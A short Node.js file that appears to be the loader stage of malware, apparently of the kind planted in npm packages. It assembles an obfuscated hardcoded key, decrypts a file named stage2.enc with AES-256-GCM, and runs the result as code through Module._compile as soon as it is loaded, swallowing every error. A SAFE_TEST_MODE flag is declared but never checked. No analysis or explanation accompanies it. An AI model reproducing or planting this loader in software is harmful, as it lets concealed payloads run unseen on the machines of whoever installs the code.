const SAFE_TEST_MODE = true;

const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const _k1 = "s4ndw0rm";
const _k2 = "_k3y_";
const _k3 = "2024";
const _k4 = "_v3ry_s3cr3t";
const KEY_MATERIAL = _k1 + _k2 + _k3 + _k4;

function loadStage2() {
  const encryptedPath = path.join(__dirname, "stage2.enc");

  try {
    const raw = fs.readFileSync(encryptedPath, "utf-8").trim();
    const parts = raw.split(":");

    if (parts.length !== 3) return;

    const iv = Buffer.from(parts[0], "hex");
    const authTag = Buffer.from(parts[1], "hex");
    const encrypted = parts[2];

    const key = crypto.createHash("sha256").update(KEY_MATERIAL).digest();

    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(encrypted, "hex", "utf8");
    decrypted += decipher.final("utf8");

    const Module = require("module");
    const m = new Module();
    m._compile(decrypted, "stage2.js");
  } catch (e) {

  }
}

loadStage2();
